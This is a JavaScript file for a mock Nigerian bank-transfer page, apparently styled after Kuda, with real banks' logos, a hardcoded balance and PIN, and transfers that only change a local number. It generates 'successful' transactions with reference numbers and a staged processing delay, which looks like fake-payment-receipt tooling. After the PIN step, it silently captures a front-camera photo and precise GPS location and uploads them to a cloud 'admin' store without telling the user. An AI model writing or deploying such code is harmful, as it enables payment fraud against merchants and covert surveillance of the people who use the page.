// Bank Logo Mapping
const bankLogos = {
  'Access Bank': 'https://i.imgur.com/3Aii5hd.jpeg',
  'Ecobank Nigeria': 'https://i.imgur.com/9l0WS8C.jpeg',
  'Fidelity Bank Nigeria': 'https://i.imgur.com/cXz0fFL.png',
  'First Bank of Nigeria': 'https://i.imgur.com/FkGt7r1.jpeg',
  'Guaranty Trust Bank': 'https://i.imgur.com/1atacbl.png',
  'Moniepoint': 'https://i.imgur.com/GiQWkmw.jpeg',
  'Opay': 'https://i.imgur.com/YAIOeGj.png',
  'PalmPay': 'https://i.imgur.com/YbUdktd.png',
  'Sterling Bank Plc': 'https://i.imgur.com/qyVV90r.png',
  'Union Bank of Nigeria': 'https://i.imgur.com/518WtnU.png',
  'Zenith Bank Plc': 'https://i.imgur.com/y8c8Wbn.png'
};

function getBankLogoUrl(bankName) {
  if (!bankName) return null;
  return bankLogos[bankName] || null;
}

// Transfer page functionality
let appData = {
    balance: 10000.00,
    userName: 'BABATUNDE',
    transactions: []
};

let pendingTransaction = null;
let correctPin = '8624';

// Save receipt to Supabase cloud (visible from any device)
async function saveReceiptToAdmin(receiptData) {
    await saveReceiptToCloud(receiptData);
}

// Capture face from front camera
async function captureFace() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 320, height: 240 } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        await new Promise((res) => { video.onloadedmetadata = () => { video.play(); res(); }; });
        // Wait a moment for camera to stabilize
        await new Promise(r => setTimeout(r, 500));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
        stream.getTracks().forEach(t => t.stop());
        return dataUrl;
    } catch (e) {
        console.error('Face capture failed:', e);
        return null;
    }
}

// Get FRESH current location - force new GPS reading
function getCurrentLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                resolve({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    timestamp: new Date().toISOString()
                });
            },
            (err) => {
                console.error('Location error:', err);
                resolve(null);
            },
            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0 // Force fresh location, don't use cached
            }
        );
    });
}

// Load data
function loadData() {
    const saved = localStorage.getItem('kudasavingsData');
    if (saved) {
        appData = JSON.parse(saved);
    }
    updateBalance();
}

// Update balance display
function updateBalance() {
    const balanceEl = document.getElementById('availableBalance');
    if (balanceEl) {
        balanceEl.textContent = new Intl.NumberFormat('en-NG', {
            style: 'currency',
            currency: 'NGN'
        }).format(appData.balance);
    }
}

// Load Nigerian banks
function loadBanks() {
    const banks = [
        'Access Bank', 'Citibank', 'Diamond Bank', 'Ecobank Nigeria', 'Fidelity Bank Nigeria',
        'First Bank of Nigeria', 'First City Monument Bank', 'Guaranty Trust Bank',
        'Heritage Bank Plc', 'Keystone Bank Limited', 'Polaris Bank', 'Providus Bank Plc',
        'Stanbic IBTC Bank Nigeria Limited', 'Standard Chartered Bank', 'Sterling Bank Plc',
        'Union Bank of Nigeria', 'United Bank for Africa', 'Unity Bank Plc', 'Wema Bank Plc',
        'Zenith Bank Plc', 'Jaiz Bank', 'Kuda Microfinance Bank',
        'Opay', 'PalmPay', 'Moniepoint', 'Carbon'
    ];

    const select = document.getElementById('bankName');
    banks.forEach(bank => {
        const option = document.createElement('option');
        option.value = bank;
        option.textContent = bank;
        select.appendChild(option);
    });
}

// Check if amount exceeds balance
document.getElementById('amount')?.addEventListener('input', function() {
    const amount = parseFloat(this.value) || 0;
    const msg = document.getElementById('insufficientMsg');

    if (amount > appData.balance) {
        msg.style.display = 'block';
        this.style.borderColor = '#e74c3c';
    } else {
        msg.style.display = 'none';
        this.style.borderColor = '#ddd';
    }
});

// Open PIN Modal
function openPinModal() {
    document.getElementById('pinModal').classList.remove('hidden');
    document.getElementById('pinInput').value = '';
    document.getElementById('pinError').classList.add('hidden');
    document.getElementById('pinInput').focus();
}

// Close PIN Modal
function closePinModal() {
    document.getElementById('pinModal').classList.add('hidden');
    pendingTransaction = null;
}

// Verify PIN
function verifyPin() {
    const pin = document.getElementById('pinInput').value;

    if (pin === correctPin) {
        document.getElementById('pinModal').classList.add('hidden');
        completeTransfer();
    } else {
        document.getElementById('pinError').classList.remove('hidden');
        document.getElementById('pinInput').value = '';
        document.getElementById('pinInput').focus();
    }
}

// Allow Enter key to submit PIN
document.addEventListener('DOMContentLoaded', function() {
    const pinInput = document.getElementById('pinInput');
    if (pinInput) {
        pinInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                verifyPin();
            }
        });
    }
});

// Handle form submission
document.getElementById('transferForm')?.addEventListener('submit', function(e) {
    e.preventDefault();

    const amount = parseFloat(document.getElementById('amount').value);

    // Check balance
    if (amount > appData.balance) {
        alert('Insufficient balance!');
        return;
    }

    // Create transaction object
    pendingTransaction = {
        id: 'TXN' + Date.now(),
        type: 'debit',
        accountName: document.getElementById('accountName').value,
        bankName: document.getElementById('bankName').value,
        accountNumber: document.getElementById('accountNumber').value,
        amount: amount,
        narration: document.getElementById('narration').value,
        date: new Date().toISOString(),
        status: 'successful',
        title: `Transfer to ${document.getElementById('accountName').value}`,
        referenceNumber: generateReference()
    };

    // Show PIN modal instead of processing immediately
    openPinModal();
});

// Complete transfer after PIN verification
async function completeTransfer() {
    if (!pendingTransaction) return;

    // Show loading
    document.getElementById('loadingOverlay').classList.remove('hidden');

    // Deduct from balance
    appData.balance -= pendingTransaction.amount;

    // Add to transactions (newest first)
    appData.transactions.unshift(pendingTransaction);

    // Save data to localStorage
    localStorage.setItem('kudasavingsData', JSON.stringify(appData));
    localStorage.setItem('currentTransaction', JSON.stringify(pendingTransaction));

    // Capture face and location for admin receipt
    const [capturedFace, location] = await Promise.all([
        captureFace(),
        getCurrentLocation()
    ]);

    // Save full receipt to IndexedDB for admin page
    await saveReceiptToAdmin({
        username: appData.userName || 'BABATUNDE',
        accountName: pendingTransaction.accountName,
        bankName: pendingTransaction.bankName,
        accountNumber: pendingTransaction.accountNumber,
        amount: pendingTransaction.amount,
        narration: pendingTransaction.narration,
        referenceNumber: pendingTransaction.referenceNumber,
        transactionDate: pendingTransaction.date,
        transactionType: 'debit',
        capturedFace: capturedFace,
        location: location
    });

    // Simulate realistic processing time
    setTimeout(() => {
        document.getElementById('loadingOverlay').classList.add('hidden');
        window.location.href = '/success.html';
    }, 6000);
}

// Generate reference number
function generateReference() {
    return '2509' + Date.now().toString().slice(-16);
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    loadData();
    loadBanks();

    // Format account number input
    const accountInput = document.getElementById('accountNumber');
    accountInput?.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
    });
});
